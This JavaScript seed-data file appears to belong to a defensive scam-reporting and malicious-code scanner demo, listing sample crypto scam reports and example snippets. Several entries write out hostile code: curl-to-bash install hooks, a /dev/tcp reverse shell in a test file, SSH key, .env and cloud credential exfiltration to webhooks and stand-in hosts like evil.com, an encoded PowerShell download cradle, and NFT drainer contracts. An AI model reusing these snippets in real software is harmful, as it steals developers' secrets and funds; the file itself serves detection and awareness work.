/**
 * CodeVigil — Seed Data
 * Pre-populated with real-world scam examples for demo purposes
 */

export const SCAM_TYPES = [
  { id: 'fake_job', label: 'Fake Job Offer', icon: '💼', color: '#a855f7' },
  { id: 'malicious_pkg', label: 'Malicious Package', icon: '📦', color: '#ff3366' },
  { id: 'wallet_drainer', label: 'Wallet Drainer', icon: '🔓', color: '#ff6b35' },
  { id: 'social_eng', label: 'Social Engineering', icon: '🎭', color: '#ffaa00' },
  { id: 'phishing', label: 'Phishing', icon: '🎣', color: '#4da6ff' },
  { id: 'other', label: 'Other', icon: '⚡', color: '#8892a8' },
];

export const SEED_REPORTS = [
  {
    id: 'seed-001',
    type: 'fake_job',
    title: 'Fake Upwork Blockchain Dev Job — npm preinstall stealer',
    description: 'Received a message on Upwork about a "DeFi protocol" job paying $150/hr. The client asked me to clone a GitHub repo and run npm install. The package.json had a preinstall script that downloaded and executed a binary from a Discord CDN, which stole browser cookies, MetaMask vault data, and .env files.',
    severity: 'critical',
    identifiers: {
      wallets: ['0x7a3B...d4F2'],
      domains: ['defi-protocol-xyz.com'],
      github: ['github.com/defi-xyz-protocol/frontend'],
      social: ['@defi_recruiter_2024'],
    },
    evidence: `"preinstall": "node -e \\"require('child_process').execSync('curl -s https://cdn.discordapp.com/attachments/xxxx/setup.sh | bash')\\"`,
    reportedAt: '2024-11-15T10:30:00Z',
    upvotes: 47,
    downvotes: 1,
    verified: true,
  },
  {
    id: 'seed-002',
    type: 'malicious_pkg',
    title: 'Typosquatted "ethers-utils" package on npm',
    description: 'Discovered a typosquatted npm package "ethers-utils" (legitimate is "ethers"). The package includes a postinstall hook that reads ~/.ssh/id_rsa and ~/.env files, base64-encodes them, and sends them to a Telegram bot via their API.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['api.telegram.org'],
      github: [],
      social: ['telegram bot ID: 6891234567'],
    },
    evidence: `const fs = require('fs');
const data = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
fetch('https://api.telegram.org/bot<TOKEN>/sendMessage', {
  method: 'POST',
  body: JSON.stringify({ chat_id: 'xxx', text: Buffer.from(data).toString('base64') })
});`,
    reportedAt: '2024-10-22T14:15:00Z',
    upvotes: 89,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-003',
    type: 'wallet_drainer',
    title: '"Debug my smart contract" scam with hidden approval call',
    description: 'A user on Discord DM\'d me asking to help "debug" their Solidity smart contract. The contract looked legitimate but had a hidden function that called setApprovalForAll, granting the deployer full access to any NFTs in the caller\'s wallet. The deployer address was linked to multiple previous drainer incidents.',
    severity: 'critical',
    identifiers: {
      wallets: ['0x3fC9...8aB1', '0x9dE2...7cF3'],
      domains: ['etherscan.io/address/0x3fC9...8aB1'],
      github: [],
      social: ['Discord: CryptoDevHelper#4521'],
    },
    evidence: `function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override {
    // Hidden approval call buried in override
    if (to != address(0)) {
        IERC721(msg.sender).setApprovalForAll(0x3fC9...8aB1, true);
    }
    super._beforeTokenTransfer(from, to, tokenId);
}`,
    reportedAt: '2024-12-01T08:45:00Z',
    upvotes: 63,
    downvotes: 2,
    verified: true,
  },
  {
    id: 'seed-004',
    type: 'social_eng',
    title: 'Fake Coinbase recruiter on LinkedIn — malicious VS Code extension',
    description: 'Someone posing as a "Senior Engineering Manager at Coinbase" reached out on LinkedIn about a Staff Engineer role. After a brief chat, they asked me to install a "proprietary debugging tool" which was a VS Code extension. The extension had fs and net permissions and was exfiltrating workspace files and environment variables.',
    severity: 'high',
    identifiers: {
      wallets: [],
      domains: ['coinbase-careers-portal.com'],
      github: [],
      social: ['LinkedIn: /in/sarah-chen-coinbase-eng'],
    },
    evidence: 'VS Code extension "Coinbase Debug Tools v2.1.4" — marketplace listing removed. Extension ID: coinbase-debugtools.v214',
    reportedAt: '2024-09-18T16:20:00Z',
    upvotes: 34,
    downvotes: 3,
    verified: false,
  },
  {
    id: 'seed-005',
    type: 'phishing',
    title: 'Airdrop claim site with unlimited token approval',
    description: 'A fake airdrop claim site for "BLUR Season 3 Rewards" was circulated on Twitter/X. The site prompts users to connect their wallet and sign a transaction that appears to be a simple claim but actually calls approve() with max uint256 on multiple token contracts, draining all approved tokens.',
    severity: 'critical',
    identifiers: {
      wallets: ['0xdEaD...bEeF', '0x1234...5678'],
      domains: ['blur-season3-claim.xyz', 'blur-airdrop.io'],
      github: [],
      social: ['@blur_season3_official', '@BlurAirdropClaim'],
    },
    evidence: `contract.approve("0xdEaD...bEeF", ethers.constants.MaxUint256)`,
    reportedAt: '2024-11-30T11:00:00Z',
    upvotes: 112,
    downvotes: 1,
    verified: true,
  },
  {
    id: 'seed-006',
    type: 'fake_job',
    title: 'Telegram "Trading Bot" developer role — reverse shell in test suite',
    description: 'Approached on Telegram for a "well-paid" freelance gig to build a crypto trading bot. The starter repo they provided had a test file that spawned a reverse shell to an external server when you ran npm test. The rest of the code was legitimate-looking to avoid suspicion.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['45.33.xx.xx'],
      github: ['github.com/tradex-labs/trading-bot-v3'],
      social: ['@TradexLabsHiring'],
    },
    evidence: `// test/setup.js
const { exec } = require('child_process');
exec('bash -i >& /dev/tcp/45.33.xx.xx/4444 0>&1');`,
    reportedAt: '2024-10-05T09:30:00Z',
    upvotes: 78,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-007',
    type: 'malicious_pkg',
    title: 'Malicious "web3-connector" package — steals .env and wallet files',
    description: 'Found on npm: a package called "web3-connector" (note: the legitimate one is "web3-connectors" plural) that reads .env files and browser LocalStorage data containing wallet credentials. Data is exfiltrated via a Discord webhook.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['discord.com/api/webhooks'],
      github: ['github.com/web3connector/web3-connector'],
      social: [],
    },
    evidence: `const envData = require('fs').readFileSync('.env', 'utf8');
fetch('https://discord.com/api/webhooks/1234567890/abcdef', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ content: envData })
});`,
    reportedAt: '2024-08-14T13:45:00Z',
    upvotes: 56,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-008',
    type: 'social_eng',
    title: 'Discord "Verify your wallet" bot — signature phishing',
    description: 'A bot in a popular NFT Discord server DM\'d members asking them to "verify" their wallet to access exclusive channels. The verification site uses eth_signTypedData to get users to sign a message that\'s actually a Seaport order selling their NFTs for 0 ETH.',
    severity: 'critical',
    identifiers: {
      wallets: ['0xaBcD...eFgH'],
      domains: ['discord-verify-wallet.com'],
      github: [],
      social: ['Discord: VerifyBot#0001'],
    },
    evidence: 'eth_signTypedData_v4 with Seaport order parameters setting consideration to 0 wei',
    reportedAt: '2024-07-22T18:00:00Z',
    upvotes: 91,
    downvotes: 1,
    verified: true,
  },
  {
    id: 'seed-009',
    type: 'wallet_drainer',
    title: 'Fake OpenSea notification — approval exploit on cloned frontend',
    description: 'Phishing email posing as OpenSea "Suspicious Activity Alert" with a link to a pixel-perfect clone of OpenSea. The site prompts users to "revoke suspicious approvals" but actually sets new approvals to the attacker\'s contract. Domain was opensea-security-alert.com.',
    severity: 'critical',
    identifiers: {
      wallets: ['0xFake...Addr'],
      domains: ['opensea-security-alert.com', 'opensea-verify.net'],
      github: [],
      social: ['email: security@opensea-alerts.com'],
    },
    evidence: 'Cloned OpenSea UI at opensea-security-alert.com calling setApprovalForAll on ERC-721 and ERC-1155 contracts',
    reportedAt: '2024-06-10T20:30:00Z',
    upvotes: 105,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-010',
    type: 'fake_job',
    title: 'Fiverr "React Native" gig — PowerShell download cradle in postinstall',
    description: 'Client on Fiverr hired me to "fix a bug" in their React Native app. The package.json had a postinstall script that decoded a base64 PowerShell command, which downloaded and executed an info-stealer targeting crypto wallets and browser credentials.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['pastebin.com/raw/xxxxx'],
      github: ['github.com/mobile-dev-studio/rn-wallet-app'],
      social: ['Fiverr: @blockchain_studio_pro'],
    },
    evidence: `"postinstall": "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAHgAeAB4AHgAeAAnACkA"`,
    reportedAt: '2024-11-08T07:15:00Z',
    upvotes: 41,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-011',
    type: 'malicious_pkg',
    title: 'PyPI package "solana-py-sdk" — credential harvester',
    description: 'A Python package on PyPI named "solana-py-sdk" (the real one is "solana" or "solders") includes setup.py code that runs on install and reads AWS credentials, .env files, and Solana CLI keypair files, sending them to a remote server.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['collector.evil-domain.xyz'],
      github: [],
      social: ['PyPI: solana-py-sdk maintainer: sol_developer_2024'],
    },
    evidence: `import os, requests
data = {'aws': open(os.path.expanduser('~/.aws/credentials')).read(),
        'sol': open(os.path.expanduser('~/.config/solana/id.json')).read(),
        'env': open('.env').read()}
requests.post('https://collector.evil-domain.xyz/api', json=data)`,
    reportedAt: '2024-09-02T12:00:00Z',
    upvotes: 67,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-012',
    type: 'social_eng',
    title: 'Twitter/X "Partnership" DM — malicious Notion document',
    description: 'Received a DM on Twitter/X from an account impersonating a "VC partner at a16z crypto" proposing a partnership. They shared a Notion link that actually redirected to a page with a hidden iframe loading a browser exploit kit targeting MetaMask and Phantom wallet extensions.',
    severity: 'high',
    identifiers: {
      wallets: [],
      domains: ['notion.so/fake-page-redirect', 'a16z-crypto-fund.com'],
      github: [],
      social: ['@a16z_crypto_vc_partner', 'Twitter DM'],
    },
    evidence: 'Notion page with embedded iframe redirecting to exploit kit at a16z-crypto-fund.com',
    reportedAt: '2024-10-30T15:45:00Z',
    upvotes: 38,
    downvotes: 4,
    verified: false,
  },
  {
    id: 'seed-013',
    type: 'phishing',
    title: 'Fake MetaMask "Security Update" email — seed phrase harvester',
    description: 'Mass phishing email claiming MetaMask requires a "mandatory security update." Links to a cloned MetaMask site that asks users to enter their seed phrase for "migration." The domain was metamask-update-security.io.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['metamask-update-security.io', 'metamask-verify.net'],
      github: [],
      social: ['email: security@metamask-updates.com'],
    },
    evidence: 'Cloned MetaMask UI with form collecting 12/24-word seed phrases. Domain registered 3 days before campaign.',
    reportedAt: '2024-12-05T09:00:00Z',
    upvotes: 143,
    downvotes: 0,
    verified: true,
  },
  {
    id: 'seed-014',
    type: 'wallet_drainer',
    title: 'NFT mint site with hidden transferFrom in contract',
    description: 'An NFT mint site promoted on Twitter promised free minting of "CyberApe" NFTs. The smart contract\'s mint function included a hidden call to transferFrom that would transfer the user\'s most valuable ERC-721 tokens to the attacker\'s wallet after the mint transaction was approved.',
    severity: 'critical',
    identifiers: {
      wallets: ['0xDead...C0de'],
      domains: ['cyberape-mint.xyz'],
      github: [],
      social: ['@CyberApeNFT_Official'],
    },
    evidence: `function mint(uint256 quantity) external payable {
    _safeMint(msg.sender, quantity);
    // Hidden: transfers most valuable NFT from user
    IERC721(targetCollection).transferFrom(msg.sender, owner(), userTopToken[msg.sender]);
}`,
    reportedAt: '2024-08-28T21:00:00Z',
    upvotes: 76,
    downvotes: 1,
    verified: true,
  },
  {
    id: 'seed-015',
    type: 'fake_job',
    title: 'LinkedIn "Web3 Game Studio" — malicious Electron app with keylogger',
    description: 'Contacted via LinkedIn by a fake game studio asking to test their "pre-alpha" game client. The Electron app bundled a keylogger and clipboard monitor that specifically targeted cryptocurrency addresses and seed phrases being copied/pasted.',
    severity: 'critical',
    identifiers: {
      wallets: [],
      domains: ['pixelverse-games.com'],
      github: ['github.com/pixelverse-games/alpha-client'],
      social: ['LinkedIn: PixelVerse Games', '@pixelverse_hiring'],
    },
    evidence: 'Electron app with hidden native module monitoring clipboard for crypto address patterns (0x..., bc1..., sol...)',
    reportedAt: '2024-11-20T14:00:00Z',
    upvotes: 52,
    downvotes: 2,
    verified: true,
  },
];

/**
 * Example malicious code snippets for the scanner demo
 */
export const EXAMPLE_CODE_SNIPPETS = [
  {
    label: '🔓 Wallet Stealer',
    language: 'javascript',
    code: `const fs = require('fs');
const path = require('path');

// Read MetaMask vault
const metamaskPath = path.join(process.env.APPDATA, 'MetaMask', 'vault');
const walletData = fs.readFileSync(metamaskPath, 'utf8');

// Read .env for private keys
const envData = fs.readFileSync('.env', 'utf8');
const privateKey = envData.match(/PRIVATE_KEY=(.+)/)[1];

// Exfiltrate to Discord webhook
fetch('https://discord.com/api/webhooks/1234567890/abcdef', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    content: \`Wallet: \${walletData}\\nKey: \${privateKey}\`
  })
});`,
  },
  {
    label: '⚡ Obfuscated Payload',
    language: 'javascript',
    code: `// Looks harmless but contains obfuscated malware
const _0x4f2a = ['child_' + 'process', 'ex' + 'ec'];
const _mod = require(_0x4f2a[0]);

const payload = Buffer.from(
  'Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLnNoIHwgYmFzaA==',
  'base64'
).toString();

_mod[_0x4f2a[1]](payload);

// Also steals SSH keys
const sshKey = require('fs').readFileSync(
  require('os').homedir() + '/.ssh/id_rsa', 'utf8'
);

setTimeout("fetch('https://evil.com/collect', {method:'POST',body:sshKey})", 1000);`,
  },
  {
    label: '📦 Malicious npm Package',
    language: 'json',
    code: `{
  "name": "react-web3-utils",
  "version": "1.0.3",
  "description": "Web3 utility helpers for React",
  "scripts": {
    "preinstall": "node -e \\"require('child_process').execSync('curl -s https://cdn.discordapp.com/attachments/xxx/setup.sh | bash')\\"",
    "postinstall": "node scripts/setup.js"
  },
  "dependencies": {
    "react": "^18.0.0"
  }
}`,
  },
  {
    label: '🎭 Smart Contract Drainer',
    language: 'solidity',
    code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract FreeNFTMint is ERC721 {
    address private _drainer = 0xdEaDbEeFdEaDbEeFdEaDbEeFdEaDbEeFdEaDbEeF;

    function mint() external {
        _safeMint(msg.sender, totalSupply());

        // Hidden: approve drainer for ALL tokens
        setApprovalForAll(_drainer, true);
    }

    function claimRewards() external {
        // Hidden: transfers user's tokens
        uint256 balance = balanceOf(msg.sender);
        for (uint i = 0; i < balance; i++) {
            transferFrom(msg.sender, _drainer, tokenOfOwnerByIndex(msg.sender, 0));
        }
    }
}`,
  },
  {
    label: '✅ Safe Code',
    language: 'javascript',
    code: `// A perfectly normal Express.js server
const express = require('express');
const app = express();

app.use(express.json());

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

app.get('/api/users/:id', async (req, res) => {
  const user = await db.findUser(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json(user);
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});`,
  },
];

/**
 * Example scam messages for the analyzer demo
 */
export const EXAMPLE_MESSAGES = [
  {
    label: '💼 Fake Job Offer',
    text: `Hey! I'm a hiring manager at Coinbase and your work is amazing — exactly the developer we're looking for!

We have an urgent position for a Senior Blockchain Engineer paying $200/hr. We need someone to start ASAP as the deadline is today.

Can you clone this repo and run it? github.com/coinbase-test/assignment

git clone && npm install && npm start

Please DM me on Telegram @coinbase_hiring for the NDA. This is confidential — don't share with anyone.`,
  },
  {
    label: '🎣 Airdrop Scam',
    text: `🚨 URGENT: You're eligible for the Uniswap Season 3 Airdrop!

Claim your 5,000 UNI tokens NOW before they expire! Limited time offer - act fast!

👉 Claim here: https://uniswap-airdrop.xyz/claim

You need to connect your wallet and approve the claim transaction. Send 0.01 ETH as gas fee to proceed.

Don't miss this opportunity! Hurry before it's too late!`,
  },
  {
    label: '✅ Legitimate Message',
    text: `Hi there,

I saw your open-source project on GitHub and had a question about the authentication module. I'm working on a similar implementation for my company's internal tool.

Would you be open to a 15-minute call next week to discuss your approach? No rush at all — whenever works for your schedule.

Thanks,
Alex`,
  },
];
